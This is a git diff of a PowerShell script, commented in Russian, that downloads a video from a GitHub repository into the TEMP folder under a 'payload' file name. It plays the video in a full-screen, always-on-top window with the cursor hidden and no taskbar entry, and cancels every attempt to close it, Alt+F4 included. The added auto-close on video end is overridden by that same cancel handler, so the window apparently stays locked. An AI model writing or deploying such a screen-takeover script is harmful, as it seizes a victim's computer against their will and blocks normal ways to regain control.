@@ -1,41 +1,31 @@
-# Блок загрузки необходимых библиотек Windows для графики
 Add-Type -AssemblyName PresentationFramework,PresentationCore,WindowsBase
 
-# Ссылки и пути
-$url = 'https://github.com/ymkeee/T-Embed/raw/refs/heads/main/assets/0224(2).wmv'
-$file = "$env:TEMP\video_payload.wmv"
+# Новая ссылка на MP4
+$u = 'https://github.com/ymkeee/T-Embed/raw/refs/heads/main/edit.mp4'
+$f = "$env:TEMP\edit_payload.mp4"
 
-# Скачиваем видео, если его еще нет
-if (-not (Test-Path $file)) {
-    Invoke-WebRequest -Uri $url -OutFile $file
+if (-not (Test-Path $f)) {
+    Invoke-WebRequest -Uri $u -OutFile $f
 }
 
-# XAML разметка окна (максимально "чистая")
 [xml]$xaml = @"
 <Window xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
-        WindowStyle="None" 
-        WindowState="Maximized" 
-        Topmost="True" 
-        Background="Black" 
-        Cursor="None">
+        WindowStyle="None" WindowState="Maximized" Topmost="True" 
+        Background="Black" Cursor="None" ShowInTaskbar="False">
     <Grid>
-        <MediaElement Name="vid" 
-                      Source="$file" 
-                      LoadedBehavior="Play" 
-                      UnloadedBehavior="Stop" 
-                      Stretch="Uniform"/>
+        <MediaElement Name="v" Source="$f" LoadedBehavior="Play" Stretch="Uniform" />
     </Grid>
 </Window>
 "@
 
-# Загрузка окна
 $reader = New-Object System.Xml.XmlNodeReader $xaml
-$window = [Windows.Markup.XamlReader]::Load($reader)
+$w = [Windows.Markup.XamlReader]::Load($reader)
 
-# Защита от закрытия (Alt+F4 не сработает)
-$window.Add_Closing({
-    $_.Cancel = $true
-})
+# Закрыть окно автоматически, когда видео закончится
+$v = $w.FindName("v")
+$v.add_MediaEnded({ $w.Close() })
 
-# Запуск
-$window.ShowDialog() | Out-Null
+# Запрет закрытия через Alt+F4 (по желанию)
+$w.Add_Closing({ $_.Cancel = $true })
+
+$w.ShowDialog() | Out-Null
